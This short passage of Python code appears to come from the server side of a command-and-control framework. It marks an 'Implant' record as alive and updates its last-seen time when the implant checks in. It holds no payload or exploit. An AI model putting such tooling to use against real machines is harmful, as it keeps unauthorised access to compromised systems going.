                now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
                update_object(Implant, {Implant.last_seen: now, Implant.alive: "Yes"}, {Implant.id: implant_id})
                return default_response()
